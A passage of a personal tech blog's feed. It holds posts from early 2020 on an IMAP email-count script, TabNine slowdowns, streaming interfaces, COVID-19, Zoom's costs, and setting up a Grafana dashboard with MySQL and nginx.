<span class="n">db_host</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">db_user</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">db_pass</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">db_database</span> <span class="o">=</span> <span class="s">''</span>

<span class="k">def</span> <span class="nf">get_num_emails</span><span class="p">(</span><span class="n">creds</span><span class="p">):</span>
    <span class="n">imap</span> <span class="o">=</span> <span class="n">imaplib</span><span class="p">.</span><span class="n">IMAP4_SSL</span><span class="p">(</span><span class="n">creds</span><span class="p">[</span><span class="s">'imap_host'</span><span class="p">],</span> <span class="n">creds</span><span class="p">[</span><span class="s">'imap_port'</span><span class="p">])</span>
    <span class="n">imap</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">creds</span><span class="p">[</span><span class="s">'imap_user'</span><span class="p">],</span> <span class="n">creds</span><span class="p">[</span><span class="s">'imap_pass'</span><span class="p">])</span>
    <span class="n">imap</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="s">'Inbox'</span><span class="p">)</span>
    <span class="n">tmp</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">imap</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">'ALL'</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">save_stats</span><span class="p">(</span><span class="n">account_name</span><span class="p">,</span> <span class="n">num_emails</span><span class="p">):</span>
    <span class="n">mydb</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span>
        <span class="n">host</span> <span class="o">=</span> <span class="n">db_host</span><span class="p">,</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">db_user</span><span class="p">,</span>
        <span class="n">passwd</span> <span class="o">=</span> <span class="n">db_pass</span><span class="p">,</span>
        <span class="n">database</span> <span class="o">=</span> <span class="n">db_database</span><span class="p">,</span>
    <span class="p">)</span>
    <span class="n">mycursor</span> <span class="o">=</span> <span class="n">mydb</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>

    <span class="n">sql</span> <span class="o">=</span> <span class="s">"INSERT INTO email_stats (account_name, num_emails) VALUES (%s, %s)"</span>
    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">account_name</span><span class="p">,</span> <span class="n">num_emails</span><span class="p">)</span>
    <span class="n">mycursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
    <span class="n">mydb</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">mycursor</span><span class="p">.</span><span class="n">rowcount</span><span class="p">,</span> <span class="s">"record inserted."</span><span class="p">)</span>

<span class="k">for</span> <span class="n">account_name</span><span class="p">,</span> <span class="n">creds</span> <span class="ow">in</span> <span class="n">IMAP_INFO</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
    <span class="n">num_emails</span> <span class="o">=</span> <span class="n">get_num_emails</span><span class="p">(</span><span class="n">creds</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Fetched'</span><span class="p">,</span> <span class="n">num_emails</span><span class="p">,</span> <span class="s">'in'</span><span class="p">,</span> <span class="n">account_name</span><span class="p">)</span>
    <span class="n">save_stats</span><span class="p">(</span><span class="n">account_name</span><span class="p">,</span> <span class="n">num_emails</span><span class="p">)</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Disabling TabNine to improve Ubuntu performance</title>
   <link href="http://dangoldin.com/2020/03/29/disabling-tabnine-to-improve-ubuntu-performance/"/>
   <updated>2020-03-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/03/29/disabling-tabnine-to-improve-ubuntu-performance</id>
   <content:encoded><![CDATA[
<p>At the end of 2018 I switched from using a Mac to using Ubuntu on a ThinkPad. While much of the development experience is better the one thing that’s noticeably worse is performance (usually first noticed in browsers) coupled with the occasional computer freeze. Back in the day when nearly everyone used Windows I remember the blue screens and the need to reboot frequently and I’m finding Ubuntu has developed the same pattern. I rarely had to reboot by Mac but find myself rebooting my current laptop at least once a week.</p>

<p>Lately it’s gotten worse so every time the performance feels sluggish I’ve opened up the terminal and started identifying patterns using top and htop. They’re often cryptic with either Chrome or Brave taking up nearly 100% of the CPU which doesn’t give me much info other than that a browser restart will offer a temporary reprieve. But every once in a while I noticed that one of my VS Code plugins, <a href="https://tabnine.com/">TabNine</a>, also spiked up to 100% usage. TabNine is a language-agnostic autocomplete plugin that I’ve become a huge fan of yet disabling it has drastically improved the performance. There are a few issues (<a href="https://github.com/codota/TabNine/issues/24">1</a>, <a href="https://github.com/codota/TabNine/issues/43">2</a>, <a href="https://github.com/codota/TabNine/issues/183">3</a>) on GitHub describing the negative performance so I’m hopeful it’s resolved but until then I’m happy to sacrifice it for improved performance. The summary here is that if you’re running TabNine on Ubuntu and running into performance issues try disabling it. Moreover, if you’re running into any noticeable performance degradation it may very well be a random extension and the only way to find out is to debug your processes and identify the cause.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A TikTok experience for streaming services</title>
   <link href="http://dangoldin.com/2020/03/29/a-tiktok-experience-for-streaming-services/"/>
   <updated>2020-03-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/03/29/a-tiktok-experience-for-streaming-services</id>
   <content:encoded><![CDATA[
<p>During an <a href="https://stratechery.com/2020/an-interview-with-eugene-wei-about-the-half-life-of-information/">interview</a> with Ben Thomson, <a href="https://www.eugenewei.com/">Eugene Wei</a> has the following response to a question digging into Netflix solving the “I just want something on in the background” use case:</p>

<blockquote>
    <p>Yeah, that’s a great point. I also do hope that this macro shock forces the streaming companies to think a little bit harder about innovating on their user interfaces. I still think it’s a little bit of a shame that most of them still present the grid of icons. Everybody has probably had that experience of just paralysis where you’re just scrolling around, you’re like, “What do I watch? I don’t know what to choose.”</p>
    <p>Linear TV, where you just turn it on and something is playing, is not necessarily the model to imitate and the old TV Guide is not the ideal, but I do think there was something about how when I used to turn on my TV, SportsCenter would just be playing and then I would kind of get sucked in. Everybody has that experience where one the movies that you have on DVD and you never watch, but then suddenly it’s like Shawshank Redemption is on or something and you just sit down and just start watching it. I would love to see more innovation on interfaces to increase the value of your library and to make it more attractive or salient for viewers.</p>
</blockquote>

<p>Both the question and response were incredibly insightful. I haven’t had a regular cable subscription in a very long time and rarely watch broadcast television but it does seem Netflix is moving slowly in that direction by having more and more shows autoplaying. Unfortunately, because the viewer knows they have the option to go find something different, the bar for them to continue watching the existing stream is incredibly high.</p>

<p>The exchange also got me brainstorming of a format that’s between linear and grid and I couldn’t help but think of TikTok. It’s linear in that you can only go forward and yet you have the ability to both skip and rely on its recommendation engine to learn and give you what you want. This model works great for TikTok where the clips are short and I wonder if the same approach might work for a standard streaming service if the clips were just trailers or previews. Imagine opening up Netflix and seeing a TV-like channel that just has trailers. If something looks good you can start watching the full thing. If it looks terrible you can skip to the next one. And over the course of all this watching Netflix is able to learn what you’re interested in and hopefully give you better and better choices. Another company that might benefit from this approach is Quibi - they’re focusing on shorter shows where a TikTok-like experience might work well with the shorter show durations.</p>

<p>Every streaming service has nearly the same user experience and it’s reasonable given the nascency of the field. It will be interesting to see each evolves based on the problems they’re trying to solve and what they’re all trying to optimize.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>COVID-19</title>
   <link href="http://dangoldin.com/2020/03/28/covid-19/"/>
   <updated>2020-03-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/03/28/covid-19</id>
   <content:encoded><![CDATA[
<p>It’s taken me a few weeks to write this post. Partly due to lack of motivation, partly lack of time, and partly due to my fluctuating feelings towards COVID-19.</p>

<p>Some days I was completely disillusioned and sad about the modern state of the world. It seems to be spreading unconstrained despite the more than one hundred years of scientific progress we’ve had since 1918. Politicians seem to care about their own ego more than they do about the people they purport to represent. If we didn’t have the resources or knowledge to fight back I’d be more accepting of our fate but it’s the fact that we can fight and defeat this thing if we just channel our energies the right way that’s frustrating.</p>

<p>Other days I feel optimistic that we’ll get it under control. Many private companies and localities are stepping up and there are countless stories of people helping people. Crises allow the best parts of humanity to stand out and seeing these bright spots make me optimistic. I’m hopeful that after this settles the world will be much better positioned to fight future epidemics. I’m hopeful that the world learns from this and chooses leaders that are willing to make personal sacrifices for the good of others. I’m hopeful that we’ll invest in our healthcare systems - both in extra capacity for times like these but also in keeping the costs affordable and encouraging good health. I’m hopeful that we start trusting science and scientists again. Lastly. I’m hopeful that we all get through this safely and that kids these days use this experience as motivation to build a better world.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Zoom's blow up and their financials</title>
   <link href="http://dangoldin.com/2020/03/15/zooms-blow-up-and-their-financials/"/>
   <updated>2020-03-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/03/15/zooms-blow-up-and-their-financials</id>
   <content:encoded><![CDATA[
<p>Zoom has had an incredible rise in the past few weeks as the tech world has shifted to remote work with nearly all meetings occurring over video conferencing. The stock is up 30% over the past month and it’s the top app in Apple’s app store - all great things! What I’m curious about is their current financial performance. Zoom makes money by charging a flat fee per user per month. And that fee was set based on both the value delivered but also some assumptions around usage. What happens to their margin if customers go from using Zoom for a few hours a week to multiple hours in day?</p>

<img src="http://dangoldin.com/assets/static/images/zoom-s1-financials.png" alt="Zoom's S-1" width="848" height="349" layout="responsive"/>

<p>From their <a href="https://www.sec.gov/Archives/edgar/data/1585521/000119312519083351/d642624ds1.htm">S-1</a> it looks as if the cost of revenue has been consistently between 17% and 21% for the past 8 quarters - the bulk of this is likely the infrastructure to support the streaming product since it’s incredibly correlated with their growth. This makes it seem that a 5x increase in usage would significantly eat into their margin but I suspect I’m missing something. As a bottoms-up approach I took a look at their <a href="https://support.zoom.us/hc/en-us/articles/201362023-System-Requirements-for-PC-Mac-and-Linux">system requirements</a> to get a feel for their bandwidth usage. They recommend 600 kbps up/down for standard definition and 1.2 Mbps up/down for high def. If we assume someone is in a Zoom meeting 8 hours a day, 5 days a week at peak usage then over the course of 4 weeks they’re consuming 10.8 gigabytes (600 * 1e3 / 8 * 60 * 60 * 8 * 5 / 1e9) in standard definition and 21.6 gigabytes in high def. Amazon’s public data egress pricing (outside of Asia) is $0.045 per gigabyte so these full time Zoomers end up costing Zoom anywhere between 50 cents and a dollar per month. Of course this assumes a one-to-one feed and as the number of participants in a meeting increase the costs can go up pretty quickly although I expect Zoom made some optimizations to avoid sending the non-visible streams.</p>

<p>The above approaches paint a very different picture - the first makes it seem that the Zoom infrastructure is incredibly expensive to operate while the latter makes it seem that it’s incredibly cheap. I suspect the reality is somewhere in between. In any case, their current usage explosion is  incredibly valuable for them - both because they’re likely still profitable but also because they’re able to acquire new customers that will convert to the higher margin when things get back to normal. Their next earnings report will be very interesting to follow.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Paying for improved productivity</title>
   <link href="http://dangoldin.com/2020/03/01/paying-for-improved-productivity/"/>
   <updated>2020-03-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/03/01/paying-for-improved-productivity</id>
   <content:encoded><![CDATA[
<p>Years ago I used to prioritize cost when it came to developer tools. I’d resist paying for anything if I could find an open source alternative that worked reasonably well. These days I prioritize my effectiveness and am much more likely to pay for the right tool. A great example of this is my search for a database IDE. I started using <a href="https://www.sequelpro.com/">Sequel Pro</a> (when I was on a mac) for MySQL and <a href="http://squirrel-sql.sourceforge.net/">SQuirreL</a> for everything else. Sequel Pro was great - it was smooth, responsive, and felt optimized for MySQL. SQuirreL, on the other hand, was designed to support nearly all databases which made it worse across all of them.</p>

<p>A coworker turned me on to DataGrip and I haven’t looked elsewhere since. It has everything I enjoyed in Sequel Pro expanded to a variety of other database engines (somehow even Mongo support). My current usage only scratches the surface of what’s possible and it’s always interesting discovering a new trick - the most recent example is the ability to compare schemas across multiple databases.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My personal Grafana dashboard</title>
   <link href="http://dangoldin.com/2020/02/27/my-personal-grafana-dashboard/"/>
   <updated>2020-02-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/02/27/my-personal-grafana-dashboard</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/personal-grafana-dashboard-blog-stats.png" alt="My personal Grafana dashboard for blog stats" width="1913" height="978" layout="responsive"/>

<p>Last year I wrote about the idea of a <a href="/2019/07/10/personal-dashboards/">personal dashboard</a> and earlier this year I described my <a href="/2020/01/28/2020-goals/">2020 goals</a> and how I’d go about measuring my progress. The past two days I was able to combine the two concepts and created a simple Grafana dashboard to measure my progress against the blogging goal. As with most tasks, the most difficult part was getting started and the actual exercise took a few hours. While it’s still fresh in my mind I want to document the step by step process in order to both provide a perspective into how I work while also giving others a guide to setting up their own.</p>

<ul>
  <li><strong>Decide on the Grafana backend</strong>. I already committed to Grafana as the visualization layer but needed to decide on the actual statistics backend. This isn’t that important of a decision and I can change it any time so I just chose MySQL. I have a personal instance of MySQL floating around (who doesn’t?), am not going to be dumping much data into it, and am comfortable writing SQL queries.</li>
  <li><strong>Set up MySQL</strong>. I already had a MySQL instance up so this required setting up a new database and the appropriate users. Note that I needed to create a master user for adding the data as well as a read-only user that Grafana uses for querying.</li>
</ul>
<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">CREATE</span> <span class="k">USER</span> <span class="s1">'stats_user'</span><span class="o">@</span><span class="s1">'%'</span> <span class="n">IDENTIFIED</span> <span class="k">BY</span> <span class="s1">'XYZ'</span><span class="p">;</span>
<span class="k">GRANT</span> <span class="k">SELECT</span><span class="p">,</span><span class="k">INSERT</span><span class="p">,</span><span class="k">UPDATE</span><span class="p">,</span><span class="k">DELETE</span><span class="p">,</span><span class="k">CREATE</span><span class="p">,</span><span class="k">DROP</span><span class="p">,</span><span class="k">ALTER</span><span class="p">,</span><span class="k">INDEX</span><span class="p">,</span><span class="k">CREATE</span> <span class="k">TEMPORARY</span> <span class="n">TABLES</span><span class="p">,</span><span class="k">CREATE</span> <span class="k">VIEW</span><span class="p">,</span><span class="k">SHOW</span> <span class="k">VIEW</span> <span class="k">ON</span> <span class="n">stats</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'stats_user'</span><span class="o">@</span><span class="s1">'%'</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">USER</span> <span class="s1">'stats_read'</span><span class="o">@</span><span class="s1">'%'</span> <span class="n">IDENTIFIED</span> <span class="k">BY</span> <span class="s1">'ABC'</span><span class="p">;</span>
<span class="k">GRANT</span> <span class="k">SELECT</span> <span class="k">ON</span> <span class="n">stats</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'stats_read'</span><span class="o">@</span><span class="s1">'%'</span><span class="p">;</span></code></pre></figure>

<ul>
  <li><strong>Determine the MySQL schema</strong>. Since I know both the unit I want to analyze (blog post) and the metric I care about the schema practically writes itself. At first I chose date, title, and a few of the fields but tweaked this after the subsequent step.</li>
</ul>
<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">create</span> <span class="k">table</span> <span class="n">blog_post</span> <span class="p">(</span>
    <span class="n">ymd</span> <span class="nb">date</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">slug</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">title</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">keywords</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">description</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">tags</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_chars</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_text_words</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_text_description</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_keywords</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_tags</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_images</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="n">num_links</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span>
    <span class="k">unique</span> <span class="k">key</span> <span class="p">(</span><span class="n">ymd</span><span class="p">,</span> <span class="n">slug</span><span class="p">)</span>
<span class="p">);</span></code></pre></figure>

<ul>
  <li><strong>Get the data into MySQL</strong>. Lucky for me I already had an old <a href="https://github.com/dangoldin/blog-analytics">blog analysis script</a> that took my blog, cleaned up all the posts, and dumped the contents to a CSV. I had to make a few tweaks to the script to allow me to specify the exact fields to write out but after that was done I had a CSV file that could be imported to MySQL. I had a few options for how to get this data into MySQL including modifying the above script to connect to MySQL but instead decided that using a manual <code class="language-plaintext highlighter-rouge">LOAD DATA</code> command would suffice for now. Out of all the steps this one took the longest time - especially figuring out the right syntax for the <code class="language-plaintext highlighter-rouge">LOAD DATA</code> command.</li>
</ul>
<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">LOAD</span> <span class="k">DATA</span> <span class="k">LOCAL</span> <span class="n">INFILE</span> <span class="s1">'/home/dan/code/blog-analytics/out.csv'</span>
  <span class="k">REPLACE</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="n">blog_post</span>
    <span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">','</span> <span class="n">ENCLOSED</span> <span class="k">BY</span> <span class="s1">'"'</span> <span class="n">ESCAPED</span> <span class="k">BY</span> <span class="s1">'"'</span>
    <span class="n">LINES</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="k">IGNORE</span> <span class="mi">1</span> <span class="n">LINES</span>
    <span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="n">tags</span><span class="p">,</span><span class="n">keywords</span><span class="p">,</span><span class="n">description</span><span class="p">,</span><span class="n">num_chars</span><span class="p">,</span><span class="n">num_text_words</span><span class="p">,</span><span class="n">num_text_description</span><span class="p">,</span><span class="n">num_keywords</span><span class="p">,</span><span class="n">num_tags</span><span class="p">,</span><span class="n">num_images</span><span class="p">,</span><span class="n">num_links</span><span class="p">,</span><span class="n">ymd</span><span class="p">,</span><span class="n">slug</span><span class="p">);</span></code></pre></figure>

<ul>
  <li><strong>Connect Grafana to MySQL</strong>. Grafana worked right out of the box after installation with <code class="language-plaintext highlighter-rouge">apt get</code> but I had to create a read-only user as Grafana refused to use a user that had write access.</li>
  <li><strong>Create a few dashboards</strong>. Now came the fun part. I started by trying to use Grafana’s query builder took but quickly resorted to just writing the SQL manually. The nuance here was having to convert the MySQL date field into a UNIX timestamp that worked with Grafana.</li>
</ul>
<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span>
  <span class="n">UNIX_TIMESTAMP</span><span class="p">(</span><span class="n">ymd</span><span class="p">)</span> <span class="k">AS</span> <span class="nv">"time"</span><span class="p">,</span>
  <span class="n">num_chars</span>
<span class="k">FROM</span> <span class="n">blog_post</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="n">UNIX_TIMESTAMP</span><span class="p">(</span><span class="n">ymd</span><span class="p">);</span>

<span class="k">SELECT</span>
  <span class="n">UNIX_TIMESTAMP</span><span class="p">(</span><span class="n">date_format</span><span class="p">(</span><span class="n">ymd</span><span class="p">,</span> <span class="s1">'%Y-%m-01'</span><span class="p">))</span> <span class="k">AS</span> <span class="nv">"time"</span><span class="p">,</span>
  <span class="k">avg</span><span class="p">(</span><span class="n">num_chars</span><span class="p">)</span> <span class="k">as</span> <span class="n">average_monthly_chars</span>
<span class="k">FROM</span> <span class="n">blog_post</span>
<span class="k">GROUP</span> <span class="k">BY</span> <span class="nb">time</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="nb">time</span></code></pre></figure>

<ul>
  <li><strong>Clean up the deployment</strong>. By default, Grafana runs on port 3000 and I wanted to serve it on a standard port behind HTTPS. This required installing nginx (via <code class="language-plaintext highlighter-rouge">apt get</code>), using it to create a simple reverse proxy, and then using <a href="https://letsencrypt.org/">Let’s Encrypt</a> to add SSL. At this point I also gave this a unique Grafana subdomain.</li>
</ul>
<figure class="highlight"><pre><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>

	<span class="kn">server_name</span> <span class="s">xyz.abc</span><span class="p">;</span>

	<span class="kn">location</span> <span class="n">/</span> <span class="p">{</span>
		 <span class="kn">proxy_pass</span> <span class="s">http://localhost:3000/</span><span class="p">;</span>
	<span class="p">}</span>

    <span class="kn">listen</span> <span class="s">[::]:443</span> <span class="s">ssl</span> <span class="s">ipv6only=on</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
    <span class="kn">listen</span> <span class="mi">443</span> <span class="s">ssl</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
    <span class="kn">ssl_certificate</span> <span class="n">/etc/letsencrypt/live/xyz.abc/fullchain.pem</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
    <span class="kn">ssl_certificate_key</span> <span class="n">/etc/letsencrypt/live/xyz.abc/privkey.pem</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
    <span class="kn">include</span> <span class="n">/etc/letsencrypt/options-ssl-nginx.conf</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
    <span class="kn">ssl_dhparam</span> <span class="n">/etc/letsencrypt/ssl-dhparams.pem</span><span class="p">;</span> <span class="c1"># managed by Certbot</span>
<span class="p">}</span></code></pre></figure>

<p>The solution is far from perfect - for example if the instance hosting Grafana goes down I’d have to repeat the bulk of the above steps. At the same time, that’s a risk I’m currently willing to take, especially since the process itself was so quick and I’m manually saving down the JSON behind the dashboard.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Embracing smartphone productivity</title>
   <link href="http://dangoldin.com/2020/02/11/embracing-smartphone-productivity/"/>
   <updated>2020-02-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/02/11/embracing-smartphone-productivity</id>
   <content:encoded><![CDATA[
<p>Unlike a modern teenager, I tend to avoid using my smartphone for anything except consumption. I’d read emails but not respond, check up on Twitter but not tweet, look at my calendar but not schedule any events, and so forth. The excuse was that I’d be able to do these much more effectively in front of a real computer. Lately, I’ve realized that while the above is true I can still knock out a ton of small and simple tasks on my phone and save the meaty stuff for the computer. I’m not much more willing to respond to an email or send an invite on my phone rather than waiting to get on a computer. It also has the side benefit of reducing the amount of items on my mental todo list which will inevitably have loss.</p>

<p>The way I think about my approach is that I used to operate more akin to a queue - accumulating tasks throughout the day and then breezing through the list when I was at full capacity. Now I’m trying an approach that’s more akin to a dequeue where I’m able to both save tasks for later while also handling the most recent one. As in software, the dequeue is both a more complicated yet more powerful structure that will hopefully improve my productivity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Repository of configurations</title>
   <link href="http://dangoldin.com/2020/02/07/repository-of-configurations/"/>
   <updated>2020-02-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/02/07/repository-of-configurations</id>
   <content:encoded><![CDATA[
<p>While tuning Kafka yet another time I started thinking of how useful a repository of configuration files would be. Very often we install an open-source project and default to the standard options. This works great when you’re starting out but as you grow you realize the deployment is no longer cutting it. So you go back to the documentation and do a few searches to see how others have it tuned. This gives you a bit of breathing and lets you keep going until the next scaling bottleneck. Throughout you’re likely scaling up, out, or both and yet very few of us actually know whether we’re properly configured.</p>

<p>I suspect most of us do a pretty crappy job at configuring our software and instead rely on the scaling to solve our problems. That is a perfectly reasonable solution when the scaling cost is low but as you grow that cost becomes more and more significant and would benefit from some knowledgeable optimization. If it truly is a critical component you end up either building up the knowledge in house through experience, hiring someone to manage it, or paying a vendor to have it managed.</p>

<p>I wish there was an online repository of configurations that would allow one to quickly see production configurations and setups for various open source applications as well as the resulting performance. Using Kafka as an example, I’d love to see the number and type of brokers people are running, the configuration they’re using across brokers, consumers, and producers, as well as the metrics themselves - number of topics, partitions, messages in addition to the cluster performance in terms of network IO and resource usage.</p>

<p>One challenge is that the information is proprietary and unlikely to be shared. It’s possible having an anonymous submission option would solve this. Another challenge is the difficulty of the UX itself. These applications are all different and each have their own nuance that it would be difficult to come up with an approach that’s both abstract enough to support any application while being useful enough for any single one.</p>

<p>Just writing this post is motivating me to get started building this out so if you’ve stumbled onto this post and find the idea interesting please reach out - blogname without the .com @ Google’s email service.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Micromanaging is underrated</title>
   <link href="http://dangoldin.com/2020/02/04/micromanaging-is-underrated/"/>
   <updated>2020-02-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/02/04/micromanaging-is-underrated</id>
   <content:encoded><![CDATA[
<p>A common belief is that micromanaging is a poor way to manage. I subscribe to this view - it’s demotivating to have someone second-guessing every step and eliminates agency and autonomy. I’d rather have someone make a few mistakes and learn along the way rather than impose a top-down view that disincentives growth.</p>

<p>While reading <a href="https://www.amazon.com/Ride-Lifetime-Lessons-Learned-Company-ebook/dp/B07PF6XTD8/ref=tmm_kin_swatch_0?_encoding=UTF8&amp;qid=&amp;sr=">Bob Iger’s biography</a>, I came across a simple statement from his former boss and Disney CEO, Michael Eisner: “Micromanaging is underrated.” That gave me pause. So often we hear that micromanaging is terrible and no effective manager does yet here’s someone incredibly successful leaning into it. Bob Iger distances himself away from this black and white view by discussing finding the balance while admitting that in many cases the details do, in fact, matter and it’s up to the CEO to make sure the output of the team is as polished and great as possible. The passage reminded me of Steve Jobs and his reputation for being incredibly detail-oriented and obsessive. In many ways, his approach was all about micromanaging and yet Apple made some of the most incredible and breathtaking products. Clearly there’s some value in micromanaging.</p>

<p>There are always the great CEOs who go against the norms yet get results but for the rest of us it’s important to find the balance. A good leader doesn’t need to be involved in everything but should care about everything. She should know when it’s important to step in and when it’s useful to look away. There’s no right answer here and it depends on the leader, the company, the culture, and the product. What is important is to realize there are very few absolutes and to consider a variety of options when making decisions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Finding parking spots using YOLO</title>
   <link href="http://dangoldin.com/2020/01/31/finding-parking-spots-using-yolo/"/>
   <updated>2020-01-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/31/finding-parking-spots-using-yolo</id>
   <content:encoded><![CDATA[
<p>I finally managed to make a bit more progress on the Parking Spot Finder project. <a href="http://dangoldin.com/2019/12/29/finding-parked-cars-aws-vs-google-computer-vision/">Last time</a> I tested the computer vision products offered by Google and AWS to see how well they were able to detect cars. This time around I decided to actually start working on the computer vision side and found a nice <a href="https://www.pyimagesearch.com/2018/11/12/yolo-object-detection-with-opencv/">tutorial</a> that allowed me to quickly try out the YOLO computer vision library. Surprisingly, it did significantly better than AWS but was more mixed against Google. On the original image it did better than both AWS and Google at detecting the cars but it did worse than Google on the cropped images. The next step is to actually try training a model and see how well it can do. Depending on how that goes I may end up changing my approach up and see how far I can get using heuristics.</p>

<img src="http://dangoldin.com/assets/static/images/jc-street-parking-processed.jpg" alt="Daytime YOLO car detection" width="1314" height="986" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/jc-street-parking-2-processed.jpg" alt="Nighttime YOLO car detection" width="1271" height="953" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-1-processed.png" alt="Daytme YOLO car detection cropped 1" width="362" height="130" layout="intrinsic"/>

<img src="http://dangoldin.com/assets/static/images/jc-street-parking-small-2-processed.png" alt="Nighttime YOLO car detection cropped 2" width="264" height="317" layout="intrinsic"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2020 Goals</title>
   <link href="http://dangoldin.com/2020/01/28/2020-goals/"/>
   <updated>2020-01-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/01/28/2020-goals</id>
   <content:encoded><![CDATA[
<p>What better way of improving your chances of completing a task than publicly proclaiming you’re going to do it? That’s the idea for publicly posting my goals for 2020. I unfortunately skipped this exercise in 2019 but hope to correct it for 2020. It’s the start of a new decade after all and a good opportunity to get into better habits. Another lesson I’ve learned is that to hold myself truly accountable they should be measurable so I came up with a quantitative way of measuring each of them over the course of 2020.</p>

<ul>
  <li><strong>Finish up my <a href="/2019/12/26/parking-spot-finder/">Parking Spot Finder</a> project</strong>. I started digging into this at the end of 2019 but the title is self explanatory. The success here will be defined by making at least two significant commits each month and achieving my goal of identifying available parking spots over 90% of the time for my narrowly-defined streets of interest.</li>
  <li><strong>Longer, more technical blogging</strong>. I write two posts a week yet they have gotten shorter and shorter. This year I want to take a step back and focus on writing more thoughtful and longer posts. In addition, I want to move away from focusing on “meta” topics and instead do deeper writing on technical and managerial topics. Measurement here will be looking at post length as well as the tag distribution.</li>
